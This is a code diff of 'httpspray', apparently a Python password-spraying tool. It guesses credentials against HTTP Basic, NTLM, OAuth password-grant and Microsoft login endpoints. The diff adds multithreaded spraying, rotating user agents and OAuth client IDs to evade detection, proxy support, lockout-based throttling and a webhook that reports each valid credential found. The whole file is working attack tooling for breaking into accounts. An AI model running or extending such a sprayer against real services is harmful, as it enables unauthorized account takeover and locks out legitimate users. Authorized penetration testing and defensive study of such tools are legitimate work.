@@ -2,39 +2,26 @@ from argparse import ArgumentParser, Namespace
 from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
 from typing import Any, Generator
-import concurrent.futures
+import csv
+import itertools
 import json
 import random
-import sys
-import time
 import urllib.parse
 
-from requests import Response, Session
-from requests.auth import HTTPBasicAuth
-from requests_ntlm import HttpNtlmAuth
+from requests import Response
+import requests
 import urllib3
 import urllib3.connection
-import urllib3.util
 
-session = Session()
-session.verify = False
+from httpspray.module.basic import BasicSpray
+from httpspray.module.msauth import MSAuthSpray
+from httpspray.module.ntlm import NTLMSpray
+from httpspray.module.oauth import OAuthSpray
+
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-
-def basic_auth(opts: Namespace, username: str, password: str) -> Response:
-    return session.post(opts.target, auth=HTTPBasicAuth(username, password))
-
-
-def ntlm_auth(opts: Namespace, username: str, password: str) -> Response:
-    return session.post(opts.target, auth=HttpNtlmAuth(username, password))
-
-
-def oauth_password_grant(opts: Namespace, username: str, password: str) -> Response:
-    return session.post(opts.target, data=dict(client_id=opts.client_id, scope=opts.scope, username=username, password=password, grant_type='password', resource=opts.resource))
-
-
-AUTHENTICATION_METHODS = dict(basic=basic_auth, ntlm=ntlm_auth, oauth=oauth_password_grant)
+AUTHENTICATION_METHODS = dict(basic=BasicSpray, ntlm=NTLMSpray, oauth=OAuthSpray, msauth=MSAuthSpray)
 
 
 def uint(value: str) -> int:
@@ -46,112 +33,127 @@ def uint(value: str) -> int:
 
 def main() -> None:
     entrypoint = ArgumentParser()
-    entrypoint.add_argument('-t', '--target', type=urllib.parse.urlparse, metavar='URL')
+    entrypoint.add_argument('-t', '--target', type=urllib.parse.urlparse, required=True, metavar='URL')
     entrypoint.add_argument('-m', '--method', choices=tuple(AUTHENTICATION_METHODS), required=True, metavar='|'.join(AUTHENTICATION_METHODS))
+    entrypoint.add_argument('--proxy', default=None, metavar='URL')
     entrypoint.add_argument('--threads', type=uint, default=1, metavar='UINT')
-    entrypoint.add_argument('--user-agent', default='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6356.209 Safari/537.36', metavar='STRING')
     entrypoint.add_argument('--delay', type=uint, default=0, metavar='SECONDS')
     entrypoint.add_argument('--jitter', type=uint, default=0, metavar='SECONDS')
+    entrypoint.add_argument('--notify', default=None, metavar='URL')
     group = entrypoint.add_argument_group('auth')
-    group.add_argument('-u', '--user', action='append', default=[], metavar='STRING')
-    group.add_argument('-U', '--users', action='append', type=Path, default=[], metavar='FILE')
-    group.add_argument('-p', '--password', action='append', default=[], metavar='STRING')
-    group.add_argument('-P', '--passwords', action='append', type=Path, default=[], metavar='FILE')
-    group.add_argument('-c', '--credential', action='append', default=[], metavar='USER:PASS')
-    group.add_argument('-C', '--credentials', action='append', type=Path, default=[], metavar='FILE')
+    group.add_argument('-u', '--user', action='append', default=[], metavar='USER|FILE')
+    group.add_argument('-p', '--password', action='append', default=[], metavar='PASS|FILE')
+    group.add_argument('-c', '--credential', action='append', default=[], metavar='USER:PASS|FILE')
+    group.add_argument('--user-agent', action='append', default=[], metavar='STRING|FLIE')
     group = entrypoint.add_argument_group('oauth')
-    group.add_argument('--client-id', default=None, metavar='UUID')
+    group.add_argument('--client-id', action='append', default=[], metavar='UUID|FILE')
+    group.add_argument('--resource', action='append', default=[], metavar='URL|FILE')
     group.add_argument('--scope', default='openid profile offline_access', metavar='STRING')
-    group.add_argument('--resource', default=None, metavar='STRING')
 
     opts = entrypoint.parse_args()
-    #print(opts.target)
 
-    if not (((opts.user or opts.users) and (opts.password or opts.passwords)) or opts.credential or opts.credentials):
-        print('error: users, passwords or credentials missing')
+    if (not opts.user or not opts.password) and not opts.credential:
+        print('error: users and passwords or credentials must be specified')
         print()
         entrypoint.print_help()
         exit(1)
 
-    if opts.method == 'oauth' and not (opts.client_id and opts.scope and opts.resource):
-        print('error: oauth requires --client-id and --resource')
+    if opts.method in ('oauth', 'msauth') and (not opts.client_id or not opts.resource):
+        print('error: oauth and msauth require --client-id and --resource')
         print()
         entrypoint.print_help()
         exit(1)
 
-    session.headers['User-Agent'] = opts.user_agent
-    # set raw url path as internal header, also see 'make_request' below
-    session.headers['X-HTTPSpray-Path'] = opts.target.path
-    opts.target = urllib.parse.urlunparse(opts.target)
+    if opts.user_agent:
+        opts.user_agents = randomize(opts.user_agent)
+    else:
+        opts.user_agents = randomize(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6356.209 Safari/537.36'])
+    if opts.client_id:
+        opts.client_ids = randomize(opts.client_id)
+    else:
+        opts.client_ids = randomize([])
+    if opts.resource:
+        opts.resources = randomize(opts.resource)
+    else:
+        opts.resources = randomize([])
 
-    error = check(opts)
-    if error:
-        log(**error)
+    if opts.notify:
+        print(json.dumps(dict(topic=opts.notify), separators=(',', ':')), flush=True)
+
+    cls = AUTHENTICATION_METHODS[opts.method]
+    instance = cls(opts)
+    response = instance.check()
+    if response:
+        log(response, headers=dict(response.headers))
         exit(1)
-    for result in spray(opts):
-        log(**result)
-
-
-def check(opts: Namespace) -> dict[str, Any]|None:
-    if opts.method not in ('basic', 'ntlm'):
-        return None
-    response = session.get(opts.target)
-    if opts.method not in response.headers.get('WWW-Authenticate', '').lower():
-        return dict(error=f'{opts.method} authentication not supported', status_code=response.status_code, size=len(response.content), time=response.elapsed.total_seconds(), headers=dict(response.headers))
-    return None
-
-
-def spray(opts: Namespace) -> Generator[dict[str, Any], None, None]:
+    credentials = itertools.chain(
+        (line.split(':', maxsplit=1) for line in generate(opts.credential)),
+        ((username, password) for username in generate(opts.user) for password in generate(opts.password)),
+    )
+    valid_count = 0
+    lock_count = 0
     with ThreadPoolExecutor(max_workers=opts.threads) as pool:
-        futures = []
-        for username in generate(opts.user, opts.users):
-            for password in generate(opts.password, opts.passwords):
-                future = pool.submit(authenticate, opts, (username, password))
-                futures.append(future)
-        for credential in generate(opts.credential, opts.credentials):
-            username, password = credential.split(':', maxsplit=1)
-            future = pool.submit(authenticate, opts, (username, password))
-            futures.append(future)
-        for future in concurrent.futures.as_completed(futures):
-            result = future.result()
-            yield result
+        for response, result in pool.map(instance.spray, credentials):
+            log(response, **result)
+
+            if result['status'] == 'locked':
+                lock_count = min(10, lock_count + 1)
+            else:
+                lock_count = max(0, lock_count - 1)
+            if lock_count >= 10:
+                notify(opts, 'aborted due to repeated lockouts')
+                break
+
+            if opts.notify and result['status'] == 'valid':
+                valid_count += 1
+                notify(opts, f'success #{valid_count}')
 
 
-def generate(entries: list[str], paths: list[Path]) -> Generator[str, None, None]:
-    for entry in entries:
-        yield entry
-    for path in paths:
-        with open(path, 'r') as file:
-            for line in file:
-                yield line.rstrip('\n')
+def notify(opts: Namespace, message: str) -> None:
+    requests.post(opts.notify, data=message)
 
 
-def authenticate(opts: Namespace, credential: tuple[str, str]) -> dict[str, Any]:
-    auth = AUTHENTICATION_METHODS[opts.method]
-    username, password = credential
-    response = auth(opts, username, password)
-    time.sleep(random.randint(opts.delay - opts.jitter, opts.delay + opts.jitter))
-    return dict(username=username, password=password, status_code=response.status_code, size=len(response.content), time=response.elapsed.total_seconds())
+def generate(args: list[str]) -> list[str]:
+    results = []
+    for arg in args:
+        path = Path(arg)
+        if path.exists():
+            if path.suffix == '.csv':
+                with open(path) as file:
+                    for row in csv.reader(file):
+                        results.append(row[0])
+            else:
+                results.extend(line.rstrip() for line in path.read_text().splitlines())
+        else:
+            results.append(arg)
+    return results
 
 
-def log(**kwargs: Any) -> None:
-    json.dump(kwargs, sys.stdout, separators=(',', ':'))
+def randomize(args: list[str]) -> Generator[str]:
+    values = generate(args)
+    while True:
+        yield random.choice(values)
+
+
+def log(response: Response, **kwargs: Any) -> None:
+    print(json.dumps(dict(kwargs, status_code=response.status_code, size=len(response.content), time=response.elapsed.total_seconds()), separators=(',', ':')), flush=True)
 
 
 # undo path normalization applied by requests and urllib3
 # overwriting the 'url' attribute of a prepared request was not enough
 # see https://github.com/psf/requests/issues/6115#issuecomment-1913102974
 
-def make_request(self: urllib3.connectionpool.HTTPConnectionPool, conn: urllib3.connection.HTTPConnection|urllib3.connection.HTTPSConnection, method: str, url: str, body: Any, headers: dict[str, str], **kwargs: Any):
-    # headers is a reference to the global 'session.headers'
-    headers = headers.copy()
-    # overwrite request path with original path from internal header
-    url = headers.pop('X-HTTPSpray-Path')
+def _make_request(self: urllib3.connectionpool.HTTPConnectionPool, conn: urllib3.connection.HTTPConnection|urllib3.connection.HTTPSConnection, method: str, url: str, body: Any, headers: dict[str, str], **kwargs: Any):
+    if 'X-HTTPSpray-Path' in headers:
+        # headers is a reference to the global 'session.headers'
+        headers = headers.copy()
+        # overwrite request path with original path from internal header
+        url = headers.pop('X-HTTPSpray-Path')
     function = getattr(self, '_original_make_request')
     return function(conn, method, url, body, headers, **kwargs)
 
 setattr(urllib3.connectionpool.HTTPConnectionPool, '_original_make_request', urllib3.connectionpool.HTTPConnectionPool._make_request)
-setattr(urllib3.connectionpool.HTTPConnectionPool, '_make_request', make_request)
+setattr(urllib3.connectionpool.HTTPConnectionPool, '_make_request', _make_request)
 
 
 if __name__ == '__main__':
